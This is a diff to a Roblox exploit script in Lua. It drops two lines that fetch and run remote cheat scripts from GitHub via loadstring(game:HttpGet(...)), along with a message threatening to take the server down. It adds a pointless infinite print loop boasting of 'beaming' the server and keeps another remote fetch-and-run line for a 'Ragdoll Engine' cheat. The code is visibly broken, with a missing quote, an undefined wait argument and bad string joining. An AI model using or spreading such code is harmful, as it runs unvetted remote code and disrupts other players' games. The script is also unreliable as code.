@@ -12,7 +12,11 @@
 -- Update 3 Did a massive update now at like 400 lines of code and added alot of more stuff and features.
 
 wait(10)
-loadstring(game:HttpGet(https://raw.githubusercontent.com/Jxq7/MyScripts/main/more-asx.lua"))();
+while true do
+	print("SERVER GETTING BEAMED LOL")
+        print("SERVER GETTING BEAMED LOL")
+	print("SERVER GETTING BEAMED LOL")
+end
 		wait(3)
                 print("In Process Of Executing")
 		wait(Process)
@@ -50,9 +54,8 @@ end
 ----------------------------------------
 ------ RAGDOLL & OTHERS
 local RagdollEngine = 22653509 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NougatBitz/ArsenalHaxx/master/TintenFisch.lua"))();
-print("YOU HAVE 35 SECONDS TO CHOOSE WHAT YOU WANT TO DO THEN THE SERVER WILL GO DOWN! IT ONLY SUPPORTS JAILBREAK, INFECTION AND ARSENAL BUT THE OTHER CODE SUPPORTS ANY GAME!!- Script Maker" player.Name)
-if  game.CreatorId == RagdollEngine then
+
+if game.CreatorId == RagdollEngine then
 
 			print("Game = Ragdoll Engine Loading Ragdoll Engine Script")
 	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Jxq7/MyScripts/main/Ragdoll%20Engine%20%5BASX%5D.lua'),true))()
